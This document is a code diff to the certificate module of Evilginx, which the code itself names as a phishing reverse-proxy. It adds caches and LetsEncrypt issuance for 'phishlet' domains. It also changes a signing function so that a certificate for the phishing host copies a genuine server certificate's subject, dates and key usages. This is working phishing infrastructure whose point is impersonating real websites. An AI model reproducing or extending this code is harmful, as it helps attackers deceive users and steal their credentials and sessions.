@@ -25,6 +25,8 @@ import (
 	"github.com/go-acme/lego/v3/registration"
 )
 
+const HOSTS_DIR = "hosts"
+
 type CertDb struct {
 	PrivateKey    *rsa.PrivateKey
 	CACert        tls.Certificate
@@ -34,7 +36,8 @@ type CertDb struct {
 	ns            *Nameserver
 	hs            *HttpServer
 	cfg           *Config
-	cache         map[string]map[string]*tls.Certificate
+	hostCache     map[string]*tls.Certificate
+	phishletCache map[string]map[string]*tls.Certificate
 	tls_cache     map[string]*tls.Certificate
 	httpChallenge *HTTPChallenge
 }
@@ -84,7 +87,8 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 	}
 
 	legolog.Logger = log.NullLogger()
-	d.cache = make(map[string]map[string]*tls.Certificate)
+	d.hostCache = make(map[string]*tls.Certificate)
+	d.phishletCache = make(map[string]map[string]*tls.Certificate)
 	d.tls_cache = make(map[string]*tls.Certificate)
 
 	pkey_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "private.key"))
@@ -163,6 +167,159 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 		return nil, err
 	}
 
+	return d, nil
+}
+
+func (d *CertDb) Reset() {
+	d.certUser.Email = "" //hostmaster@" + d.cfg.GetBaseDomain()
+}
+
+func (d *CertDb) SetupHostnameCertificate(hostname string) error {
+	err := d.loadHostnameCertificate(hostname)
+	if err != nil {
+		log.Warning("failed to load certificate files for hostname '%s': %v", hostname, err)
+		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
+		err = d.obtainHostnameCertificate(hostname)
+		if err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func (d *CertDb) GetHostnameCertificate(hostname string) (*tls.Certificate, error) {
+	cert, ok := d.hostCache[hostname]
+	if ok {
+		return cert, nil
+	}
+	return nil, fmt.Errorf("certificate for hostname '%s' not found", hostname)
+}
+
+func (d *CertDb) addHostnameCertificate(hostname string, cert *tls.Certificate) {
+	d.hostCache[hostname] = cert
+}
+
+func (d *CertDb) loadHostnameCertificate(hostname string) error {
+	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)
+
+	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, hostname+".crt"), filepath.Join(crt_dir, hostname+".key"))
+	if err != nil {
+		return err
+	}
+	d.addHostnameCertificate(hostname, &cert)
+	return nil
+}
+
+func (d *CertDb) obtainHostnameCertificate(hostname string) error {
+	if err := CreateDir(filepath.Join(d.dataDir, HOSTS_DIR), 0700); err != nil {
+		return err
+	}
+	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)
+
+	domains := []string{hostname}
+	cert_res, err := d.registerCertificate(domains)
+	if err != nil {
+		return err
+	}
+
+	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
+	if err != nil {
+		return err
+	}
+	d.addHostnameCertificate(hostname, &cert)
+
+	err = ioutil.WriteFile(filepath.Join(crt_dir, hostname+".crt"), cert_res.Certificate, 0600)
+	if err != nil {
+		return err
+	}
+	err = ioutil.WriteFile(filepath.Join(crt_dir, hostname+".key"), cert_res.PrivateKey, 0600)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func (d *CertDb) SetupPhishletCertificate(site_name string, domains []string) error {
+	base_domain, ok := d.cfg.GetSiteDomain(site_name)
+	if !ok {
+		return fmt.Errorf("phishlet '%s' not found", site_name)
+	}
+
+	err := d.loadPhishletCertificate(site_name, base_domain)
+	if err != nil {
+		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
+		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
+		err = d.obtainPhishletCertificate(site_name, base_domain, domains)
+		if err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func (d *CertDb) GetPhishletCertificate(site_name string, base_domain string) (*tls.Certificate, error) {
+	m, ok := d.phishletCache[base_domain]
+	if ok {
+		cert, ok := m[site_name]
+		if ok {
+			return cert, nil
+		}
+	}
+	return nil, fmt.Errorf("certificate for phishlet '%s' and domain '%s' not found", site_name, base_domain)
+}
+
+func (d *CertDb) addPhishletCertificate(site_name string, base_domain string, cert *tls.Certificate) {
+	_, ok := d.phishletCache[base_domain]
+	if !ok {
+		d.phishletCache[base_domain] = make(map[string]*tls.Certificate)
+	}
+	d.phishletCache[base_domain][site_name] = cert
+}
+
+func (d *CertDb) loadPhishletCertificate(site_name string, base_domain string) error {
+	crt_dir := filepath.Join(d.dataDir, base_domain)
+
+	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
+	if err != nil {
+		return err
+	}
+	d.addPhishletCertificate(site_name, base_domain, &cert)
+	return nil
+}
+
+func (d *CertDb) obtainPhishletCertificate(site_name string, base_domain string, domains []string) error {
+	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil {
+		return err
+	}
+	crt_dir := filepath.Join(d.dataDir, base_domain)
+
+	cert_res, err := d.registerCertificate(domains)
+	if err != nil {
+		return err
+	}
+
+	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
+	if err != nil {
+		return err
+	}
+
+	d.addPhishletCertificate(site_name, base_domain, &cert)
+
+	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
+	if err != nil {
+		return err
+	}
+	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func (d *CertDb) registerCertificate(domains []string) (*certificate.Resource, error) {
+	var err error
 	d.certUser = CertUser{
 		Email: "", //hostmaster@" + d.cfg.GetBaseDomain(),
 		key:   d.PrivateKey,
@@ -182,70 +339,9 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 	d.client.Challenge.SetHTTP01Provider(d.httpChallenge)
 	d.client.Challenge.Remove(challenge.TLSALPN01)
 
-	return d, nil
-}
-
-func (d *CertDb) Reset() {
-	d.certUser.Email = "" //hostmaster@" + d.cfg.GetBaseDomain()
-}
-
-func (d *CertDb) SetupCertificate(site_name string, domains []string) error {
-	base_domain, ok := d.cfg.GetSiteDomain(site_name)
-	if !ok {
-		return fmt.Errorf("phishlet '%s' not found", site_name)
-	}
-
-	err := d.loadCertificate(site_name, base_domain)
-	if err != nil {
-		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
-		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
-		err = d.obtainCertificate(site_name, base_domain, domains)
-		if err != nil {
-			return err
-		}
-	}
-	return nil
-}
-
-func (d *CertDb) GetCertificate(site_name string, base_domain string) (*tls.Certificate, error) {
-	m, ok := d.cache[base_domain]
-	if ok {
-		cert, ok := m[site_name]
-		if ok {
-			return cert, nil
-		}
-	}
-	return nil, fmt.Errorf("certificate for phishlet '%s' and domain '%s' not found", site_name, base_domain)
-}
-
-func (d *CertDb) addCertificate(site_name string, base_domain string, cert *tls.Certificate) {
-	_, ok := d.cache[base_domain]
-	if !ok {
-		d.cache[base_domain] = make(map[string]*tls.Certificate)
-	}
-	d.cache[base_domain][site_name] = cert
-}
-
-func (d *CertDb) loadCertificate(site_name string, base_domain string) error {
-	crt_dir := filepath.Join(d.dataDir, base_domain)
-
-	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
-	if err != nil {
-		return err
-	}
-	d.addCertificate(site_name, base_domain, &cert)
-	return nil
-}
-
-func (d *CertDb) obtainCertificate(site_name string, base_domain string, domains []string) error {
-	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil {
-		return err
-	}
-	crt_dir := filepath.Join(d.dataDir, base_domain)
-
 	reg, err := d.client.Registration.Register(registration.RegisterOptions{TermsOfServiceAgreed: true})
 	if err != nil {
-		return err
+		return nil, err
 	}
 	d.certUser.Registration = reg
 
@@ -256,25 +352,10 @@ func (d *CertDb) obtainCertificate(site_name string, base_domain string, domains
 
 	cert_res, err := d.client.Certificate.Obtain(req)
 	if err != nil {
-		return err
+		return nil, err
 	}
 
-	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
-	if err != nil {
-		return err
-	}
-	d.addCertificate(site_name, base_domain, &cert)
-
-	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
-	if err != nil {
-		return err
-	}
-	err = ioutil.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
-	if err != nil {
-		return err
-	}
-
-	return nil
+	return cert_res, nil
 }
 
 func (d *CertDb) getServerCertificate(host string, port int) *x509.Certificate {
@@ -306,10 +387,7 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 		return
 	}
 
-	srvCert := d.getServerCertificate(host, port)
-	if srvCert == nil {
-		return nil, fmt.Errorf("failed to get TLS certificate for: %s", host)
-	} else {
+	if phish_host == "" {
 		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
 		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
 		if err != nil {
@@ -319,16 +397,40 @@ func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int
 		template = x509.Certificate{
 			SerialNumber:          serialNumber,
 			Issuer:                x509ca.Subject,
-			Subject:               srvCert.Subject,
-			NotBefore:             srvCert.NotBefore,
-			NotAfter:              srvCert.NotAfter,
-			KeyUsage:              srvCert.KeyUsage,
-			ExtKeyUsage:           srvCert.ExtKeyUsage,
-			IPAddresses:           srvCert.IPAddresses,
-			DNSNames:              []string{phish_host},
+			Subject:               pkix.Name{Organization: []string{"Evilginx Signature Trust Co."}},
+			NotBefore:             time.Now(),
+			NotAfter:              time.Now().Add(time.Hour * 24 * 180),
+			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+			DNSNames:              []string{host},
 			BasicConstraintsValid: true,
 		}
-		template.Subject.CommonName = phish_host
+		template.Subject.CommonName = host
+	} else {
+		srvCert := d.getServerCertificate(host, port)
+		if srvCert == nil {
+			return nil, fmt.Errorf("failed to get TLS certificate for: %s", host)
+		} else {
+			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
+			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+			if err != nil {
+				return nil, err
+			}
+
+			template = x509.Certificate{
+				SerialNumber:          serialNumber,
+				Issuer:                x509ca.Subject,
+				Subject:               srvCert.Subject,
+				NotBefore:             srvCert.NotBefore,
+				NotAfter:              srvCert.NotAfter,
+				KeyUsage:              srvCert.KeyUsage,
+				ExtKeyUsage:           srvCert.ExtKeyUsage,
+				IPAddresses:           srvCert.IPAddresses,
+				DNSNames:              []string{phish_host},
+				BasicConstraintsValid: true,
+			}
+			template.Subject.CommonName = phish_host
+		}
 	}
 
 	var pkey *rsa.PrivateKey
